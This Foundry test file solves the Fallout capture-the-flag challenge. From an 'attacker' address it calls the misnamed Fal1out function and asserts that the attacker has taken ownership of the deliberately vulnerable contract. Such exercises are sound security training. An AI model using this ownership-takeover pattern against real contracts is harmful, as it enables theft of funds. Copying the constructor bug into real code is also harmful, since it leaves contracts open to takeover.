// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test} from "@forge-std/Test.sol";

import {DeployFalloutScript} from "@script-0_6_x/2_DeployFallout.s.sol";
import {Fallout} from "@main-0_6_x/2_Fallout.sol";

contract FalloutTest is Test, DeployFalloutScript {

    address public deployer;
    address public attacker = address(11);

    function setUp() public {

        deployer = msg.sender;

        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        DeployFalloutScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        falloutChallenge.Fal1out{value: 0.0005 ether}();

        assertEq( falloutChallenge.owner(), attacker);
       
        vm.stopPrank(  );
    }



}